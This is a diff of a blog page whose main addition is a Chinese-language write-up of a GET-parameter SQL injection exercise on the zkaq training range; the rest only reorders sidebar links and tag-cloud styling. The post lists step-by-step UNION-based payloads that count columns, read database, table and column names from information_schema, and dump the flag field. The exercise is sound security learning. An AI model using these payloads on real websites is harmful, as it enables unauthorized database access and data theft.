@@ -183,11 +183,11 @@
                         </li>
                         
                         <li>
-                            <a href="/tags/SQL-DDL/">SQL-DDL</a>
+                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/">SQL注入--POST注入</a>
                         </li>
                         
                         <li>
-                            <a href="/tags/web%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/">web通信原理</a>
+                            <a href="/tags/SQL-DDL/">SQL-DDL</a>
                         </li>
                         
                         
@@ -270,7 +270,26 @@
         </center>
     </div>
     <div class="content-article">
-        <p>一段时间没做确实生疏了0.0代码都忘了一部分,最主要的还是会忘记Mysql数据库自带的那几个库名.</p>
+        <p>一段时间没做确实生疏了0.0代码都忘了一部分,最主要的还是会忘记Mysql数据库自带的那几个库名.<strong><em>table_schema</em></strong>,information_schema.tables,information_schema.columns<br>靶场链接:<a href="https://hack.zkaq.cn/" target="_blank" rel="noopener">https://hack.zkaq.cn/</a><br><br><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/7Nu9tvQgUO1Y.png?imageslim" alt="mark"><br>一上来就可以看出这是get注入,因为在url里面传参id</p>
+<ul>
+<li><p>在后面尝试加入and 1=1 ,or 1=1,and1=2之类的判断<br><code>select *from user where id=1 and 1=1</code><br><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/1YMWsbJg2Rz3.png?imageslim" alt="mark">页面正常返回,在尝试输入<code>select *from user where id=1 and 1=2</code><br><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/lyJYixJVLIGj.png?imageslim" alt="mark">页面返回错误,这说明就是把用户输入的数据当作代码执行了</p>
+</li>
+<li><p>再使用order by测试出字段数<br><code>select *from user where id=1 order by 4</code><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/5hdyYtJ0sySE.png?imageslim" alt="mark">)<img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/FArOKd4tJbuD.png?imageslim" alt="mark">一直到order by 4的时候页面返回错误,所以可以判断出只有三个字段</p>
+</li>
+<li><p>使用连接查询来判断注入点<br><code>select *from user where id=1 union select 1,2,3</code><br><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/jp7MWslwqnQ1.png?imageslim" alt="mark">可以得知2,3是注入点</p>
+</li>
+<li><p>在注入点处替换数据库查询语句,首先爆数据库<br><code>select *from user where id=1 union select 1,2,database()</code><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/x58JxRYdzrtz.png?imageslim" alt="mark">可以看到数据库名是error</p>
+</li>
+<li><p>接着爆表<br><code>select *from user where id=1 union select 1,2,table_name from information_schema.tables where table_schema=&#39;error&#39; limit 1,1</code><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/DI4isPjzVfBz.png?imageslim" alt="mark">可以得出表名是error_flag</p>
+</li>
+<li><p>接着爆字段<br><code>select *from user where id=1 union select 1,2,column_name from information_schema.columns where table_name=&#39;error_flag&#39; limit 2,1</code><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/n4LwcdsDzdrm.png?imageslim" alt="mark"> 这个表中一共三个字段,如果不使用limit的话会直接返回最后一个字段.我们可以得出字段是flag</p>
+</li>
+<li><p>最后爆值<br><code>select *from user where id=1 union select 1,2,group_concat(flag) from error_flag</code><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/zzNKsC3iW7NH.png?imageslim" alt="mark">成功得出flag</p>
+</li>
+</ul>
+<ul>
+<li>总的来说流程就是这样的,剩下两个get注入的靶场也都只要注意下闭合就行,很简单<img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/rU9yokSXye3z.png?imageslim" alt="mark">个人打算学完zkaq之后去刷ctf题目,那边的难一点适合提升,有各种过滤,需要去绕过</li>
+</ul>
 
     </div>
 </article>
@@ -332,6 +351,18 @@
             
             <li class="list-group-item">
                 <span class="post-title">
+                    <a href="/2020/04/04/POST%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/">POST注入--zkaq靶场</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/04/04/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/">SQL注入--POST注入</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
                     <a href="/2020/04/03/Get%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/">Get注入--zkaq靶场</a>
                 </span>
             </li>
@@ -378,18 +409,6 @@
                 </span>
             </li>
             
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2020/04/02/%E5%85%B3%E4%BA%8Emarkdown2/">关于markdown2</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2020/04/02/%E4%BD%BF%E7%94%A8%E4%B8%83%E7%89%9B%E4%BA%91%E6%9D%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87/">使用七牛云来上传图片</a>
-                </span>
-            </li>
-            
         </ul>
     </div>
 </aside>
@@ -414,13 +433,7 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/03/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8AGet%E6%B3%A8%E5%85%A5/">SQL注入--原理分析以及Get注入</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2020/04/02/SQL%E8%AF%AD%E5%8F%A5-%E5%AD%90%E6%9F%A5%E8%AF%A2/">SQL语句--子查询</a>
+                    <a href="/2020/04/04/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/">SQL注入--POST注入</a>
                 </span>
             </li>
             
@@ -433,6 +446,12 @@
             <li class="list-group-item">
                 <span class="post-title">
                     <a href="/2020/04/02/SQL%E8%AF%AD%E5%8F%A5-%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0/">SQL语句--聚合函数</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/04/02/SQL%E8%AF%AD%E5%8F%A5-%E8%BF%9E%E6%8E%A5%E6%9F%A5%E8%AF%A2/">SQL语句--连接查询</a>
                 </span>
             </li>
             
@@ -462,7 +481,7 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/02/%E5%85%B3%E4%BA%8Emarkdown2/">关于markdown2</a>
+                    <a href="/2020/04/03/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8AGet%E6%B3%A8%E5%85%A5/">SQL注入--原理分析以及Get注入</a>
                 </span>
             </li>
             
@@ -495,17 +514,19 @@
                 
                 <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
     
-    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-Get%E6%B3%A8%E5%85%A5/" style="font-size: 9.81267307126144px;" class="tag-cloud-link">SQL注入--Get注入</a>
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-Get%E6%B3%A8%E5%85%A5/" style="font-size: 14.932361807325746px;" class="tag-cloud-link">SQL注入--Get注入</a>
     
-    <a href="/tags/SQL-DDL/" style="font-size: 17.456884434237004px;" class="tag-cloud-link">SQL-DDL</a>
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/" style="font-size: 12.007779466039718px;" class="tag-cloud-link">SQL注入--POST注入</a>
     
-    <a href="/tags/web%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/" style="font-size: 12.289878900526855px;" class="tag-cloud-link">web通信原理</a>
+    <a href="/tags/SQL-DDL/" style="font-size: 15.344506767750639px;" class="tag-cloud-link">SQL-DDL</a>
     
-    <a href="/tags/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" style="font-size: 9.330010256133825px;" class="tag-cloud-link">web前端安全基础</a>
+    <a href="/tags/web%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/" style="font-size: 17.962760135601705px;" class="tag-cloud-link">web通信原理</a>
     
-    <a href="/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 19.971280653338532px;" class="tag-cloud-link">序列化与反序列化</a>
+    <a href="/tags/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" style="font-size: 15.641182782916257px;" class="tag-cloud-link">web前端安全基础</a>
     
-    <a href="/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/" style="font-size: 12.847602153225871px;" class="tag-cloud-link">博客学习</a>
+    <a href="/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 15.069976635373315px;" class="tag-cloud-link">序列化与反序列化</a>
+    
+    <a href="/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/" style="font-size: 17.970845051483572px;" class="tag-cloud-link">博客学习</a>
     
 </div>
                 
